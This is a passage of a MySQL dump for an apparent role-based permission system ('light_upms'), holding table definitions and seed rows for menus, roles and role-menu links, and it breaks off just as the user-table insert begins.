	(42, 5, 'test3', 'dict-list', '', 0, '', 0, '', 1, 'ant-design:account-book-outlined', 0, 0, 1, 1, 'admin', '2022-11-06 20:31:17', 1, 'admin', '2022-11-08 22:13:02', 1),
	(43, 5, 'test2', 'dict-list', 'system/DictList', 1, '', 0, '', 1, 'ant-design:account-book-outlined', 1, 0, 1, 1, 'admin', '2022-11-06 20:32:36', 1, 'admin', '2022-11-08 22:15:05', 1),
	(44, 5, 'test111', 'dict-list', 'system/DictList', 1, '', 1, 'qqq', 1, 'ant-design:account-book-outlined', 1, 0, 1, 1, 'admin', '2022-11-06 20:33:18', 1, 'admin', '2022-11-10 21:26:31', 1),
	(45, 3, '2', '2', '2', 2, '2', 0, '2', 2, 'ant-design:account-book-filled', 0, 0, 0, 1, 'admin', '2022-11-15 17:21:22', 1, 'admin', '2022-11-15 17:22:45', 1),
	(47, 3, '修改密码', 'password-change', '/demo/system/password/index', 1, '', 0, '', 1, '', 0, 0, 0, 1, 'admin', '2022-11-18 18:14:44', 1, 'admin', '2022-11-19 21:20:38', 0);

-- 导出  表 light_upms.lu_resource 结构
CREATE TABLE IF NOT EXISTS `lu_resource` (
  `id` bigint NOT NULL AUTO_INCREMENT COMMENT '主键Id',
  `resource_name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '资源名称',
  `url` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '资源url',
  `description` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '描述',
  `category` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '分类(字典值)',
  `creater_id` bigint NOT NULL DEFAULT '0' COMMENT '创建人Id',
  `creater_name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '创建人名字',
  `create_date` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  `updater_id` bigint NOT NULL DEFAULT '0' COMMENT '更新人Id',
  `updater_name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '更新人名字',
  `update_date` datetime NOT NULL DEFAULT '1900-01-01 00:00:00' COMMENT '更新时间',
  `is_deleted` tinyint NOT NULL DEFAULT '0' COMMENT '是否删除（0未删除，1已删除）',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci COMMENT='资源(接口)';

-- 正在导出表  light_upms.lu_resource 的数据：~0 rows (大约)
DELETE FROM `lu_resource`;

-- 导出  表 light_upms.lu_role 结构
CREATE TABLE IF NOT EXISTS `lu_role` (
  `id` bigint NOT NULL AUTO_INCREMENT COMMENT '主键Id',
  `role_name` varchar(255) NOT NULL DEFAULT '' COMMENT '角色名称',
  `role_value` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '角色值',
  `description` varchar(255) NOT NULL DEFAULT '' COMMENT '描述',
  `status` tinyint NOT NULL DEFAULT '0' COMMENT '状态 0：启用；1：停用',
  `creater_id` bigint NOT NULL DEFAULT '0' COMMENT '创建人Id',
  `creater_name` varchar(255) NOT NULL DEFAULT '' COMMENT '创建人名字',
  `create_date` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  `updater_id` bigint NOT NULL DEFAULT '0' COMMENT '更新人Id',
  `updater_name` varchar(255) NOT NULL DEFAULT '' COMMENT '更新人名字',
  `update_date` datetime NOT NULL DEFAULT '1900-01-01 00:00:00' COMMENT '更新时间',
  `is_deleted` tinyint NOT NULL DEFAULT '0' COMMENT '是否删除（0未删除，1已删除）',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='角色';

-- 正在导出表  light_upms.lu_role 的数据：~8 rows (大约)
DELETE FROM `lu_role`;
INSERT INTO `lu_role` (`id`, `role_name`, `role_value`, `description`, `status`, `creater_id`, `creater_name`, `create_date`, `updater_id`, `updater_name`, `update_date`, `is_deleted`) VALUES
	(1, '管理员', 'admin', '系统管理员权限', 0, 0, '', '2020-06-03 11:52:56', 1, 'admin', '2022-11-19 22:32:58', 0),
	(2, 'hr', 'hr', '人事权限', 0, 0, '', '2020-07-03 17:52:34', 0, '', '2020-07-03 17:53:29', 1),
	(3, '1', '', '', 0, 0, '', '2020-07-03 17:58:32', 0, '', '1900-01-01 00:00:00', 1),
	(4, '维修服务', 'lightservice', '维修服务系统权限', 0, 0, '', '2020-07-06 15:59:37', 1, 'admin', '2022-11-19 22:33:23', 0),
	(5, '体验成员', 'experience', '体验', 0, 4, 'gmk', '2021-08-19 09:17:47', 1, 'admin', '2022-11-19 22:34:27', 0),
	(8, '骂了个蛋蛋', '1', '我擦擦a', 1, 0, '', '2022-07-10 22:57:53', 1, 'admin', '2022-11-18 23:15:30', 1),
	(11, '骂了个蛋蛋', 'fuck', '我擦擦', 1, 1, 'admin', '2022-11-18 23:11:37', 1, 'admin', '2022-11-18 23:15:40', 1),
	(12, '学生', 'student', '考试系统-学生的权限', 1, 1, 'admin', '2022-11-18 23:17:05', 1, 'admin', '2022-11-19 22:49:06', 0);

-- 导出  表 light_upms.lu_role_menu 结构
CREATE TABLE IF NOT EXISTS `lu_role_menu` (
  `id` bigint NOT NULL AUTO_INCREMENT COMMENT '主键Id',
  `role_id` bigint NOT NULL DEFAULT '0' COMMENT '角色Id',
  `menu_id` bigint NOT NULL DEFAULT '0' COMMENT '菜单Id',
  `creater_id` bigint NOT NULL DEFAULT '0' COMMENT '创建人Id',
  `creater_name` varchar(255) NOT NULL DEFAULT '' COMMENT '创建人名字',
  `create_date` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  `updater_id` bigint NOT NULL DEFAULT '0' COMMENT '更新人Id',
  `updater_name` varchar(20) NOT NULL DEFAULT '' COMMENT '更新人名字',
  `update_date` datetime NOT NULL DEFAULT '1900-01-01 00:00:00' COMMENT '更新时间',
  `is_deleted` tinyint NOT NULL DEFAULT '0' COMMENT '是否删除（0未删除，1已删除）',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='角色菜单';

-- 正在导出表  light_upms.lu_role_menu 的数据：~174 rows (大约)
DELETE FROM `lu_role_menu`;
INSERT INTO `lu_role_menu` (`id`, `role_id`, `menu_id`, `creater_id`, `creater_name`, `create_date`, `updater_id`, `updater_name`, `update_date`, `is_deleted`) VALUES
	(1, 1, 1, 0, '', '2020-06-03 12:05:54', 1, 'admin', '2020-09-27 14:42:04', 1),
	(2, 1, 2, 0, '', '2020-06-03 12:06:04', 1, 'admin', '2020-09-27 14:42:04', 1),
	(3, 1, 3, 0, '', '2020-06-03 12:06:04', 1, '系统管理员', '2022-10-26 22:13:41', 1),
	(4, 1, 4, 0, '', '2020-06-03 12:06:04', 1, '系统管理员', '2022-10-26 22:13:41', 1),
	(5, 1, 5, 0, '', '2020-06-03 12:06:04', 1, '系统管理员', '2022-10-26 22:13:42', 1),
	(6, 1, 6, 0, '', '2020-06-03 12:06:04', 1, '系统管理员', '2022-10-26 22:13:42', 1),
	(7, 1, 14, 0, '', '2020-06-03 12:06:04', 1, '系统管理员', '2022-10-26 22:13:45', 1),
	(8, 1, 15, 0, '', '2020-06-03 12:06:04', 1, '系统管理员', '2022-10-26 22:13:45', 1),
	(9, 1, 16, 0, '', '2020-06-03 12:06:04', 1, '系统管理员', '2022-10-26 22:13:45', 1),
	(10, 1, 17, 0, '', '2020-06-03 12:06:04', 1, '系统管理员', '2022-10-26 22:13:45', 1),
	(11, 1, 18, 0, '', '2020-06-03 12:06:04', 1, '系统管理员', '2022-10-26 22:13:45', 1),
	(12, 1, 8, 0, '', '2020-06-03 12:06:04', 0, '', '2020-09-08 15:20:36', 1),
	(13, 1, 9, 0, '', '2020-06-03 12:06:04', 0, '', '2020-09-08 15:20:36', 1),
	(14, 1, 7, 0, '', '2020-06-03 12:06:04', 1, 'admin', '2020-09-10 16:11:40', 1),
	(15, 1, 19, 0, '', '2020-06-03 12:06:04', 1, 'admin', '2020-09-27 14:42:04', 1),
	(16, 4, 18, 0, '', '2020-08-14 17:53:21', 2, 'wjg', '2021-08-10 21:19:49', 1),
	(17, 4, 1, 0, '', '2020-08-14 17:53:26', 0, '', '1900-01-01 00:00:00', 1),
	(18, 4, 2, 0, '', '2020-08-14 17:53:28', 0, '', '1900-01-01 00:00:00', 1),
	(19, 4, 17, 0, '', '2020-08-14 17:55:00', 0, '', '2020-08-14 18:18:25', 1),
	(20, 4, 5, 0, '', '2020-08-14 18:17:48', 0, '', '2020-08-14 18:18:25', 1),
	(21, 4, 11, 0, '', '2020-08-14 18:18:25', 0, '', '1900-01-01 00:00:00', 1),
	(22, 4, 6, 0, '', '2020-08-14 18:18:25', 0, '', '1900-01-01 00:00:00', 1),
	(23, 1, 20, 0, '', '2020-09-07 19:07:35', 1, '系统管理员', '2022-10-26 22:13:41', 1),
	(24, 1, 21, 0, '', '2020-09-08 15:20:36', 1, '系统管理员', '2022-10-26 22:13:41', 1),
	(25, 1, 7, 1, 'admin', '2020-09-10 17:03:17', 0, '', '1900-01-01 00:00:00', 1),
	(26, 1, 8, 1, 'admin', '2020-09-10 17:12:18', 1, '系统管理员', '2022-10-26 22:13:43', 1),
	(27, 1, 7, 1, 'admin', '2020-09-10 17:40:15', 1, '系统管理员', '2022-10-26 22:13:42', 1),
	(28, 1, 9, 1, 'admin', '2020-09-10 17:40:15', 1, '系统管理员', '2022-10-26 22:13:44', 1),
	(29, 2, 3, 1, 'admin', '2020-09-10 17:54:37', 1, 'admin', '2021-07-23 10:58:16', 0),
	(30, 2, 4, 1, 'admin', '2020-09-10 17:57:39', 1, 'admin', '2021-07-23 10:58:16', 0),
	(31, 1, 24, 1, 'admin', '2020-09-27 14:42:04', 1, '系统管理员', '2022-10-26 22:13:41', 1),
	(32, 4, 4, 1, 'admin', '2021-03-10 10:38:40', 2, 'wjg', '2021-08-10 21:19:49', 1),
	(33, 4, 3, 1, 'admin', '2021-03-10 10:38:40', 2, 'wjg', '2021-08-10 21:19:49', 1),
	(34, 1, 25, 1, 'admin', '2020-09-27 14:42:04', 0, '', '1900-01-01 00:00:00', 1),
	(35, 2, 18, 1, 'admin', '2021-07-22 20:09:34', 1, 'admin', '2021-07-23 10:58:16', 0),
	(36, 2, 5, 1, 'admin', '2021-07-22 20:09:34', 0, '', '1900-01-01 00:00:00', 1),
	(37, 2, 6, 1, 'admin', '2021-07-22 20:09:34', 0, '', '1900-01-01 00:00:00', 1),
	(38, 2, 7, 1, 'admin', '2021-07-22 20:09:34', 0, '', '1900-01-01 00:00:00', 1),
	(39, 2, 8, 1, 'admin', '2021-07-22 20:09:34', 0, '', '1900-01-01 00:00:00', 1),
	(40, 2, 9, 1, 'admin', '2021-07-22 20:09:34', 0, '', '1900-01-01 00:00:00', 1),
	(41, 2, 14, 1, 'admin', '2021-07-22 20:09:34', 0, '', '1900-01-01 00:00:00', 1),
	(42, 2, 15, 1, 'admin', '2021-07-22 20:09:34', 0, '', '1900-01-01 00:00:00', 1),
	(43, 2, 16, 1, 'admin', '2021-07-22 20:09:34', 0, '', '1900-01-01 00:00:00', 1),
	(44, 2, 17, 1, 'admin', '2021-07-22 20:09:34', 0, '', '1900-01-01 00:00:00', 1),
	(45, 2, 20, 1, 'admin', '2021-07-22 20:09:34', 0, '', '1900-01-01 00:00:00', 1),
	(46, 2, 21, 1, 'admin', '2021-07-22 20:09:34', 0, '', '1900-01-01 00:00:00', 1),
	(47, 2, 24, 1, 'admin', '2021-07-22 20:09:34', 0, '', '1900-01-01 00:00:00', 1),
	(48, 1, 26, 1, 'admin', '2020-09-27 14:42:04', 1, 'admin', '2021-07-24 17:32:02', 1),
	(49, 1, 27, 1, 'admin', '2021-07-24 17:32:02', 1, '系统管理员', '2022-10-26 22:13:41', 1),
	(50, 1, 28, 1, 'admin', '2021-07-24 17:32:02', 1, '系统管理员', '2022-10-26 22:13:41', 1),
	(51, 4, 27, 1, 'admin', '2021-07-24 23:59:39', 2, 'wjg', '2021-08-10 21:19:49', 1),
	(52, 4, 28, 1, 'admin', '2021-07-24 23:59:39', 2, 'wjg', '2021-08-10 21:19:49', 1),
	(53, 1, 29, 1, 'admin', '2020-09-27 14:42:04', 0, '', '1900-01-01 00:00:00', 1),
	(54, 1, 30, 2, 'wjg', '2021-08-10 21:19:43', 1, '系统管理员', '2022-10-26 22:13:41', 1),
	(55, 4, 30, 2, 'wjg', '2021-08-10 21:19:49', 0, '', '1900-01-01 00:00:00', 1),
	(56, 1, 26, 4, 'gmk', '2021-08-11 18:39:36', 0, '', '1900-01-01 00:00:00', 1),
	(57, 5, 28, 4, 'gmk', '2021-08-19 09:18:08', 4, 'gmk', '2021-08-19 09:22:40', 1),
	(58, 5, 30, 4, 'gmk', '2021-08-19 09:18:08', 4, 'gmk', '2021-08-19 09:22:40', 1),
	(59, 5, 27, 4, 'gmk', '2021-08-19 09:22:51', 2, 'wjg', '2021-12-16 20:29:57', 1),
	(60, 5, 28, 4, 'gmk', '2021-08-19 09:23:04', 2, 'wjg', '2021-12-16 20:29:57', 1),
	(61, 5, 30, 4, 'gmk', '2021-08-19 09:23:04', 2, 'wjg', '2021-12-16 20:29:57', 1),
	(62, 1, 31, 2, 'wjg', '2021-08-19 20:07:18', 0, '', '1900-01-01 00:00:00', 1),
	(63, 1, 33, 2, '王杰光', '2022-07-01 22:30:31', 1, '系统管理员', '2022-10-26 22:13:41', 1),
	(64, 1, 35, 2, '王杰光', '2022-07-01 22:30:31', 1, '系统管理员', '2022-10-26 22:13:41', 1),
	(65, 1, 34, 2, '王杰光', '2022-07-01 22:30:31', 1, '系统管理员', '2022-10-26 22:13:41', 1),
	(66, 1, 36, 2, '王杰光', '2022-07-01 22:30:31', 1, '系统管理员', '2022-10-26 22:13:41', 1),
	(67, 1, 37, 2, '王杰光', '2022-07-01 22:30:31', 1, '系统管理员', '2022-10-26 22:13:41', 1),
	(68, 1, 38, 2, '王杰光', '2022-07-01 22:30:31', 1, '系统管理员', '2022-10-26 22:13:42', 1),
	(69, 1, 39, 2, '王杰光', '2022-07-01 22:41:17', 1, '系统管理员', '2022-10-26 22:13:41', 1),
	(70, 1, 40, 2, '王杰光', '2022-07-01 22:41:17', 1, '系统管理员', '2022-10-26 22:13:41', 1),
	(71, 1, 41, 1, '系统管理员', '2022-09-30 19:03:50', 1, '系统管理员', '2022-10-26 22:13:45', 1),
	(72, 12, 4, 1, 'admin', '2022-11-19 21:46:42', 0, '', '1900-01-01 00:00:00', 1),
	(73, 12, 4, 1, 'admin', '2022-11-19 22:31:58', 0, '', '1900-01-01 00:00:00', 1),
	(74, 12, 3, 1, 'admin', '2022-11-19 22:32:00', 0, '', '1900-01-01 00:00:00', 1),
	(75, 12, 3, 1, 'admin', '2022-11-19 22:32:37', 0, '', '1900-01-01 00:00:00', 1),
	(76, 12, 4, 1, 'admin', '2022-11-19 22:32:38', 0, '', '1900-01-01 00:00:00', 1),
	(77, 12, 37, 1, 'admin', '2022-11-19 22:32:38', 0, '', '1900-01-01 00:00:00', 1),
	(78, 12, 38, 1, 'admin', '2022-11-19 22:32:38', 0, '', '1900-01-01 00:00:00', 1),
	(79, 12, 38, 1, 'admin', '2022-11-19 22:32:44', 0, '', '1900-01-01 00:00:00', 1),
	(80, 12, 37, 1, 'admin', '2022-11-19 22:32:44', 0, '', '1900-01-01 00:00:00', 1),
	(81, 12, 4, 1, 'admin', '2022-11-19 22:32:44', 0, '', '1900-01-01 00:00:00', 1),
	(82, 12, 3, 1, 'admin', '2022-11-19 22:32:44', 0, '', '1900-01-01 00:00:00', 1),
	(83, 12, 33, 1, 'admin', '2022-11-19 22:32:44', 0, '', '1900-01-01 00:00:00', 1),
	(84, 1, 41, 1, 'admin', '2022-11-19 22:32:59', 0, '', '1900-01-01 00:00:00', 0),
	(85, 1, 40, 1, 'admin', '2022-11-19 22:32:59', 0, '', '1900-01-01 00:00:00', 0),
	(86, 1, 39, 1, 'admin', '2022-11-19 22:32:59', 0, '', '1900-01-01 00:00:00', 0),
	(87, 1, 38, 1, 'admin', '2022-11-19 22:32:59', 0, '', '1900-01-01 00:00:00', 0),
	(88, 1, 37, 1, 'admin', '2022-11-19 22:32:59', 0, '', '1900-01-01 00:00:00', 0),
	(89, 1, 36, 1, 'admin', '2022-11-19 22:32:59', 0, '', '1900-01-01 00:00:00', 0),
	(90, 1, 34, 1, 'admin', '2022-11-19 22:32:59', 0, '', '1900-01-01 00:00:00', 0),
	(91, 1, 35, 1, 'admin', '2022-11-19 22:32:59', 0, '', '1900-01-01 00:00:00', 0),
	(92, 1, 33, 1, 'admin', '2022-11-19 22:32:59', 0, '', '1900-01-01 00:00:00', 0),
	(93, 1, 30, 1, 'admin', '2022-11-19 22:32:59', 0, '', '1900-01-01 00:00:00', 0),
	(94, 1, 28, 1, 'admin', '2022-11-19 22:32:59', 0, '', '1900-01-01 00:00:00', 0),
	(95, 1, 27, 1, 'admin', '2022-11-19 22:32:59', 0, '', '1900-01-01 00:00:00', 0),
	(96, 1, 24, 1, 'admin', '2022-11-19 22:32:59', 0, '', '1900-01-01 00:00:00', 0),
	(97, 1, 9, 1, 'admin', '2022-11-19 22:32:59', 0, '', '1900-01-01 00:00:00', 0),
	(98, 1, 7, 1, 'admin', '2022-11-19 22:32:59', 0, '', '1900-01-01 00:00:00', 0),
	(99, 1, 8, 1, 'admin', '2022-11-19 22:32:59', 0, '', '1900-01-01 00:00:00', 0),
	(100, 1, 21, 1, 'admin', '2022-11-19 22:32:59', 0, '', '1900-01-01 00:00:00', 0),
	(101, 1, 20, 1, 'admin', '2022-11-19 22:32:59', 0, '', '1900-01-01 00:00:00', 0),
	(102, 1, 18, 1, 'admin', '2022-11-19 22:32:59', 0, '', '1900-01-01 00:00:00', 0),
	(103, 1, 17, 1, 'admin', '2022-11-19 22:32:59', 0, '', '1900-01-01 00:00:00', 0),
	(104, 1, 16, 1, 'admin', '2022-11-19 22:32:59', 0, '', '1900-01-01 00:00:00', 0),
	(105, 1, 15, 1, 'admin', '2022-11-19 22:32:59', 0, '', '1900-01-01 00:00:00', 0),
	(106, 1, 14, 1, 'admin', '2022-11-19 22:32:59', 0, '', '1900-01-01 00:00:00', 0),
	(107, 1, 6, 1, 'admin', '2022-11-19 22:32:59', 0, '', '1900-01-01 00:00:00', 0),
	(108, 1, 5, 1, 'admin', '2022-11-19 22:32:59', 0, '', '1900-01-01 00:00:00', 0),
	(109, 1, 4, 1, 'admin', '2022-11-19 22:33:00', 0, '', '1900-01-01 00:00:00', 0),
	(110, 1, 3, 1, 'admin', '2022-11-19 22:33:00', 0, '', '1900-01-01 00:00:00', 0),
	(111, 1, 47, 1, 'admin', '2022-11-19 22:33:00', 0, '', '1900-01-01 00:00:00', 0),
	(112, 4, 30, 1, 'admin', '2022-11-19 22:33:23', 0, '', '1900-01-01 00:00:00', 0),
	(113, 4, 28, 1, 'admin', '2022-11-19 22:33:23', 0, '', '1900-01-01 00:00:00', 0),
	(114, 4, 27, 1, 'admin', '2022-11-19 22:33:23', 0, '', '1900-01-01 00:00:00', 0),
	(115, 4, 3, 1, 'admin', '2022-11-19 22:33:23', 0, '', '1900-01-01 00:00:00', 0),
	(116, 4, 4, 1, 'admin', '2022-11-19 22:33:23', 0, '', '1900-01-01 00:00:00', 0),
	(117, 4, 18, 1, 'admin', '2022-11-19 22:33:23', 0, '', '1900-01-01 00:00:00', 0),
	(118, 4, 39, 1, 'admin', '2022-11-19 22:33:23', 0, '', '1900-01-01 00:00:00', 0),
	(119, 12, 33, 1, 'admin', '2022-11-19 22:33:37', 0, '', '1900-01-01 00:00:00', 1),
	(120, 12, 3, 1, 'admin', '2022-11-19 22:33:37', 0, '', '1900-01-01 00:00:00', 1),
	(121, 12, 4, 1, 'admin', '2022-11-19 22:33:37', 0, '', '1900-01-01 00:00:00', 1),
	(122, 12, 37, 1, 'admin', '2022-11-19 22:33:37', 0, '', '1900-01-01 00:00:00', 1),
	(123, 12, 38, 1, 'admin', '2022-11-19 22:33:37', 0, '', '1900-01-01 00:00:00', 1),
	(124, 12, 47, 1, 'admin', '2022-11-19 22:33:37', 0, '', '1900-01-01 00:00:00', 1),
	(125, 5, 47, 1, 'admin', '2022-11-19 22:34:22', 0, '', '1900-01-01 00:00:00', 1),
	(126, 12, 47, 1, 'admin', '2022-11-19 22:41:43', 0, '', '1900-01-01 00:00:00', 1),
	(127, 12, 38, 1, 'admin', '2022-11-19 22:41:43', 0, '', '1900-01-01 00:00:00', 1),
	(128, 12, 37, 1, 'admin', '2022-11-19 22:41:43', 0, '', '1900-01-01 00:00:00', 1),
	(129, 12, 4, 1, 'admin', '2022-11-19 22:41:43', 0, '', '1900-01-01 00:00:00', 1),
	(130, 12, 3, 1, 'admin', '2022-11-19 22:41:43', 0, '', '1900-01-01 00:00:00', 1),
	(131, 12, 3, 1, 'admin', '2022-11-19 22:42:27', 0, '', '1900-01-01 00:00:00', 1),
	(132, 12, 4, 1, 'admin', '2022-11-19 22:42:27', 0, '', '1900-01-01 00:00:00', 1),
	(133, 12, 37, 1, 'admin', '2022-11-19 22:42:27', 0, '', '1900-01-01 00:00:00', 1),
	(134, 12, 38, 1, 'admin', '2022-11-19 22:42:27', 0, '', '1900-01-01 00:00:00', 1),
	(135, 12, 47, 1, 'admin', '2022-11-19 22:42:27', 0, '', '1900-01-01 00:00:00', 1),
	(136, 12, 33, 1, 'admin', '2022-11-19 22:42:27', 0, '', '1900-01-01 00:00:00', 1),
	(137, 12, 33, 1, 'admin', '2022-11-19 22:43:28', 0, '', '1900-01-01 00:00:00', 1),
	(138, 12, 47, 1, 'admin', '2022-11-19 22:43:28', 0, '', '1900-01-01 00:00:00', 1),
	(139, 12, 38, 1, 'admin', '2022-11-19 22:43:28', 0, '', '1900-01-01 00:00:00', 1),
	(140, 12, 37, 1, 'admin', '2022-11-19 22:43:28', 0, '', '1900-01-01 00:00:00', 1),
	(141, 12, 4, 1, 'admin', '2022-11-19 22:43:28', 0, '', '1900-01-01 00:00:00', 1),
	(142, 12, 3, 1, 'admin', '2022-11-19 22:43:28', 0, '', '1900-01-01 00:00:00', 1),
	(143, 12, 36, 1, 'admin', '2022-11-19 22:43:28', 0, '', '1900-01-01 00:00:00', 1),
	(144, 12, 36, 1, 'admin', '2022-11-19 22:48:39', 0, '', '1900-01-01 00:00:00', 1),
	(145, 12, 3, 1, 'admin', '2022-11-19 22:48:39', 0, '', '1900-01-01 00:00:00', 1),
	(146, 12, 4, 1, 'admin', '2022-11-19 22:48:39', 0, '', '1900-01-01 00:00:00', 1),
	(147, 12, 37, 1, 'admin', '2022-11-19 22:48:39', 0, '', '1900-01-01 00:00:00', 1),
	(148, 12, 38, 1, 'admin', '2022-11-19 22:48:39', 0, '', '1900-01-01 00:00:00', 1),
	(149, 12, 47, 1, 'admin', '2022-11-19 22:48:40', 0, '', '1900-01-01 00:00:00', 1),
	(150, 12, 33, 1, 'admin', '2022-11-19 22:48:40', 0, '', '1900-01-01 00:00:00', 1),
	(151, 12, 33, 1, 'admin', '2022-11-19 22:48:45', 0, '', '1900-01-01 00:00:00', 1),
	(152, 12, 47, 1, 'admin', '2022-11-19 22:48:45', 0, '', '1900-01-01 00:00:00', 1),
	(153, 12, 38, 1, 'admin', '2022-11-19 22:48:45', 0, '', '1900-01-01 00:00:00', 1),
	(154, 12, 37, 1, 'admin', '2022-11-19 22:48:46', 0, '', '1900-01-01 00:00:00', 1),
	(155, 12, 4, 1, 'admin', '2022-11-19 22:48:46', 0, '', '1900-01-01 00:00:00', 1),
	(156, 12, 3, 1, 'admin', '2022-11-19 22:48:46', 0, '', '1900-01-01 00:00:00', 1),
	(157, 12, 36, 1, 'admin', '2022-11-19 22:48:46', 0, '', '1900-01-01 00:00:00', 1),
	(158, 12, 3, 1, 'admin', '2022-11-19 22:48:57', 0, '', '1900-01-01 00:00:00', 1),
	(159, 12, 4, 1, 'admin', '2022-11-19 22:48:57', 0, '', '1900-01-01 00:00:00', 1),
	(160, 12, 37, 1, 'admin', '2022-11-19 22:48:57', 0, '', '1900-01-01 00:00:00', 1),
	(161, 12, 47, 1, 'admin', '2022-11-19 22:48:57', 0, '', '1900-01-01 00:00:00', 1),
	(162, 12, 33, 1, 'admin', '2022-11-19 22:48:57', 0, '', '1900-01-01 00:00:00', 1),
	(163, 12, 38, 1, 'admin', '2022-11-19 22:48:58', 0, '', '1900-01-01 00:00:00', 1),
	(164, 12, 38, 1, 'admin', '2022-11-19 22:49:00', 0, '', '1900-01-01 00:00:00', 1),
	(165, 12, 33, 1, 'admin', '2022-11-19 22:49:01', 0, '', '1900-01-01 00:00:00', 1),
	(166, 12, 47, 1, 'admin', '2022-11-19 22:49:01', 0, '', '1900-01-01 00:00:00', 1),
	(167, 12, 37, 1, 'admin', '2022-11-19 22:49:01', 0, '', '1900-01-01 00:00:00', 1),
	(168, 12, 4, 1, 'admin', '2022-11-19 22:49:01', 0, '', '1900-01-01 00:00:00', 1),
	(169, 12, 3, 1, 'admin', '2022-11-19 22:49:01', 0, '', '1900-01-01 00:00:00', 1),
	(170, 12, 3, 1, 'admin', '2022-11-19 22:49:06', 0, '', '1900-01-01 00:00:00', 0),
	(171, 12, 4, 1, 'admin', '2022-11-19 22:49:06', 0, '', '1900-01-01 00:00:00', 0),
	(172, 12, 37, 1, 'admin', '2022-11-19 22:49:06', 0, '', '1900-01-01 00:00:00', 0),
	(173, 12, 47, 1, 'admin', '2022-11-19 22:49:06', 0, '', '1900-01-01 00:00:00', 0),
	(174, 12, 38, 1, 'admin', '2022-11-19 22:49:06', 0, '', '1900-01-01 00:00:00', 0);

-- 导出  表 light_upms.lu_role_resource 结构
CREATE TABLE IF NOT EXISTS `lu_role_resource` (
  `id` bigint NOT NULL AUTO_INCREMENT COMMENT '主键Id',
  `role_id` bigint NOT NULL DEFAULT '0' COMMENT '角色Id',
  `resource_id` bigint NOT NULL DEFAULT '0' COMMENT '资源Id',
  `creater_id` bigint NOT NULL DEFAULT '0' COMMENT '创建人Id',
  `creater_name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '创建人名字',
  `create_date` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  `updater_id` bigint NOT NULL DEFAULT '0' COMMENT '更新人Id',
  `updater_name` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '更新人名字',
  `update_date` datetime NOT NULL DEFAULT '1900-01-01 00:00:00' COMMENT '更新时间',
  `is_deleted` tinyint NOT NULL DEFAULT '0' COMMENT '是否删除（0未删除，1已删除）',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci COMMENT='角色资源';

-- 正在导出表  light_upms.lu_role_resource 的数据：~0 rows (大约)
DELETE FROM `lu_role_resource`;

-- 导出  表 light_upms.lu_user 结构
CREATE TABLE IF NOT EXISTS `lu_user` (
  `id` bigint NOT NULL AUTO_INCREMENT COMMENT '主键Id',
  `user_name` varchar(255) NOT NULL DEFAULT '' COMMENT '用户名',
  `password` varchar(255) NOT NULL DEFAULT '' COMMENT '密码',
  `nick_name` varchar(255) NOT NULL DEFAULT '' COMMENT '昵称',
  `real_name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '真实姓名',
  `avatar_url` varchar(255) NOT NULL DEFAULT '' COMMENT '头像地址',
  `gender` tinyint NOT NULL DEFAULT '0' COMMENT '性别（0未知，1男，2女）',
  `phone` varchar(255) NOT NULL DEFAULT '' COMMENT '手机号',
  `email` varchar(255) NOT NULL DEFAULT '' COMMENT '邮箱',
  `dept_id` bigint NOT NULL DEFAULT '0' COMMENT '部门Id',
  `job_id` bigint NOT NULL DEFAULT '0' COMMENT '岗位Id',
  `visit_date` datetime NOT NULL DEFAULT '1900-01-01 00:00:00' COMMENT '最近访问时间',
  `description` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '描述',
  `status` tinyint NOT NULL DEFAULT '0' COMMENT '状态 0：启用；1：停用',
  `creater_id` bigint NOT NULL DEFAULT '0' COMMENT '创建人Id',
  `creater_name` varchar(255) NOT NULL DEFAULT '' COMMENT '创建人名字',
  `create_date` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  `updater_id` bigint NOT NULL DEFAULT '0' COMMENT '更新人Id',
  `updater_name` varchar(20) NOT NULL DEFAULT '' COMMENT '更新人名字',
  `update_date` datetime NOT NULL DEFAULT '1900-01-01 00:00:00' COMMENT '更新时间',
  `is_deleted` tinyint NOT NULL DEFAULT '0' COMMENT '是否删除（0未删除，1已删除）',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='用户';

-- 正在导出表  light_upms.lu_user 的数据：~10 rows (大约)
DELETE FROM `lu_user`;
INSERT INTO `lu_user` (`id`, `user_name`, `password`, `nick_name`, `real_name`, `avatar_url`, `gender`, `phone`, `email`, `dept_id`, `job_id`, `visit_date`, `description`, `status`, `creater_id`, `creater_name`, `create_date`, `updater_id`, `updater_name`, `update_date`, `is_deleted`) VALUES
